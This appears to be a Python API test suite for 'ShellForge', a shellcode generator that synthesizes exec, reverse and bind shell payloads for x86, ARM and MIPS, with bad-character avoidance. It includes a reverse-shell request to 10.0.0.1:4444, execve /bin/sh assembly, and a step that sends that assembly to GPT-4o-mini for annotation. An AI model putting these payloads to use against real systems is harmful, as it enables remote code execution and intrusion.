"""
test_phase4.py
──────────────
Phase 4 API tests. Starts the Flask app in a thread, hits all endpoints.
Run from shellforge/ root:
    OPENAI_API_KEY=your_key python tests/python/test_phase4.py

GPT annotation test is skipped if OPENAI_API_KEY is not set.
"""

import sys, os, json, time, threading
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../"))

import urllib.request
import urllib.error

PASS="✅"; FAIL="❌"
results=[]
BASE="http://127.0.0.1:5001"

def test(name, fn):
    try:
        fn()
        print(f"  {PASS} {name}")
        results.append((name, True, None))
    except Exception as e:
        print(f"  {FAIL} {name}: {e}")
        results.append((name, False, str(e)))

def post(path, body):
    data = json.dumps(body).encode()
    req  = urllib.request.Request(
        f"{BASE}{path}", data=data,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    with urllib.request.urlopen(req, timeout=30) as resp:
        return json.loads(resp.read())

def get(path):
    with urllib.request.urlopen(f"{BASE}{path}", timeout=5) as resp:
        return json.loads(resp.read())

def start_server():
    os.environ["SF_PORT"]  = "5001"
    os.environ["SF_DEBUG"] = "0"
    from python.api.app import app
    app.run(host="127.0.0.1", port=5001, debug=False, use_reloader=False)

def run():
    print("\n── ShellForge Phase 4 API Test Suite ───────────────────\n")

    # Start server in background thread
    t = threading.Thread(target=start_server, daemon=True)
    t.start()
    # Wait for server readiness
    import urllib.error
    for _ in range(20):
        try:
            urllib.request.urlopen(f"{BASE}/health", timeout=1)
            break
        except:
            time.sleep(0.3)

    # ── T1: Health check ─────────────────────────────────────
    print("[ T1 ] Health")

    def t1_health():
        r = get("/health")
        assert r["status"] == "ok"
        assert r["library"] == True
        print(f"       version: {r['version']}")
    test("GET /health returns ok", t1_health)

    # ── T2: /arches ──────────────────────────────────────────
    print("\n[ T2 ] /arches")

    def t2_arches():
        r = get("/arches")
        assert "x86_64" in r["architectures"]
        assert "arm"    in r["architectures"]
        assert "mips"   in r["architectures"]
        assert "reverse_shell" in r["goals"]
    test("GET /arches lists all targets", t2_arches)

    # ── T3: /synthesize ──────────────────────────────────────
    print("\n[ T3 ] POST /synthesize")

    def t3_exec_shell():
        r = post("/synthesize", {"arch": "x86_64", "goal": "exec_shell"})
        assert r["ok"] == True
        assert r["payload_len"] == 26
        assert r["payload_hex"].startswith("\\x")
        print(f"       payload: {r['payload_hex']}")
    test("x86-64 execve shell", t3_exec_shell)

    def t3_reverse_shell():
        r = post("/synthesize", {
            "arch": "x86_64", "goal": "reverse_shell",
            "goal_args": ["10.0.0.1:4444"]
        })
        assert r["ok"] == True
        assert r["payload_len"] == 97
        print(f"       reverse shell: {r['payload_len']} bytes")
    test("x86-64 reverse shell", t3_reverse_shell)

    def t3_null_free():
        r = post("/synthesize", {
            "arch": "x86_64", "goal": "exec_shell", "null_free": True
        })
        assert r["ok"] == True
        assert "\\x00" not in r["payload_hex"]
    test("null_free constraint respected", t3_null_free)

    def t3_bad_chars():
        r = post("/synthesize", {
            "arch": "x86_64", "goal": "exec_shell",
            "bad_chars": ["0x48"]
        })
        assert r["ok"] == True
        assert "\\x48" not in r["payload_hex"]
        print(f"       encoded: {r['encoding_used']} {r['payload_len']} bytes")
    test("bad char 0x48 avoided", t3_bad_chars)

    def t3_arm():
        r = post("/synthesize", {"arch": "arm", "goal": "exec_shell"})
        assert r["ok"] == True
        assert r["arch"] == "ARM"
        print(f"       ARM: {r['payload_len']} bytes")
    test("ARM execve shell", t3_arm)

    def t3_mips():
        r = post("/synthesize", {"arch": "mips", "goal": "exec_shell"})
        assert r["ok"] == True
        assert r["arch"] == "MIPS"
        print(f"       MIPS: {r['payload_len']} bytes")
    test("MIPS execve shell", t3_mips)

    def t3_x86_32():
        r = post("/synthesize", {"arch": "x86_32", "goal": "exec_shell"})
        assert r["ok"] == True
        print(f"       x86-32: {r['payload_len']} bytes")
    test("x86-32 execve shell", t3_x86_32)

    def t3_size_exceed():
        r = post("/synthesize", {
            "arch": "x86_64", "goal": "exec_shell", "size_budget": 5
        })
        assert r["ok"] == False
        assert r["status"] == "ERR_SIZE_EXCEED"
    test("size budget exceeded returns error", t3_size_exceed)

    def t3_bind_shell():
        r = post("/synthesize", {
            "arch": "x86_64", "goal": "bind_shell",
            "goal_args": ["4444"]
        })
        assert r["ok"] == True
        print(f"       bind shell: {r['payload_len']} bytes")
    test("x86-64 bind shell", t3_bind_shell)

    def t3_arb_write():
        r = post("/synthesize", {
            "arch": "x86_64", "goal": "arbitrary_write",
            "goal_args": ["0x7fffffffe000", "0x4141414141414141"]
        })
        assert r["ok"] == True
        print(f"       arb write: {r['payload_len']} bytes")
    test("x86-64 arbitrary write", t3_arb_write)

    def t3_disasm_present():
        r = post("/synthesize", {"arch": "x86_64", "goal": "exec_shell"})
        assert len(r["disasm"]) > 0
        assert "syscall" in r["disasm"].lower()
    test("disasm field populated", t3_disasm_present)

    def t3_hex_dump_present():
        r = post("/synthesize", {"arch": "x86_64", "goal": "exec_shell"})
        assert "0000" in r["hex_dump"]
    test("hex_dump field populated", t3_hex_dump_present)

    # ── T4: /annotate ─────────────────────────────────────────
    print("\n[ T4 ] POST /annotate")

    api_key = os.environ.get("OPENAI_API_KEY", "")

    def t4_no_key():
        try:
            r = post("/annotate", {
                "disasm": "xor rax,rax\nsyscall",
                "arch": "x86_64", "goal": "exec_shell", "encoding_used": "NONE"
            })
            assert "annotation" in r or "error" in r
        except urllib.error.HTTPError as e:
            assert e.code == 503  # no API key = acceptable
    test("/annotate returns annotation or 503", t4_no_key)

    if api_key:
        def t4_with_key():
            r = post("/annotate", {
                "disasm": "xor rsi,rsi\nxor rdx,rdx\nxor rax,rax\nmov rbx,0x68732f6e69622f2f\npush rbx\npush rsp\npop rdi\nmov al,0x3b\nsyscall",
                "arch": "x86_64",
                "goal": "exec_shell",
                "encoding_used": "NONE"
            })
            assert "annotation" in r
            assert len(r["annotation"]) > 50
            assert r["model"] == "gpt-4o-mini"
            print(f"\n       GPT annotation preview:")
            print(f"       {r['annotation'][:200]}...")
        test("GPT-4o-mini annotation (live)", t4_with_key)
    else:
        print(f"  ⚠️  /annotate live test skipped — set OPENAI_API_KEY to enable")

    # ── T5: Invalid inputs ────────────────────────────────────
    print("\n[ T5 ] Error handling")

    def t5_empty_body():
        try:
            req = urllib.request.Request(
                f"{BASE}/synthesize", data=b"not json",
                headers={"Content-Type": "application/json"}, method="POST"
            )
            urllib.request.urlopen(req, timeout=5)
        except urllib.error.HTTPError as e:
            assert e.code == 400
    test("Empty/invalid body → 400", t5_empty_body)

    def t5_unknown_arch():
        r = post("/synthesize", {"arch": "z80", "goal": "exec_shell"})
        # Unknown arch falls back to x86_64 default — should still work
        assert r["ok"] == True
    test("Unknown arch falls back to x86_64", t5_unknown_arch)

    # ── Summary ───────────────────────────────────────────────
    passed = sum(1 for _,ok,_ in results if ok)
    total  = len(results)
    print(f"\n── Results: {passed}/{total} passed ─────────────────────────\n")
    if passed < total:
        for name,ok,msg in results:
            if not ok: print(f"  {FAIL} {name}: {msg}")
        sys.exit(1)
    else:
        print("All Phase 4 tests passed. Ready for Phase 5.\n")

if __name__ == "__main__":
    run()
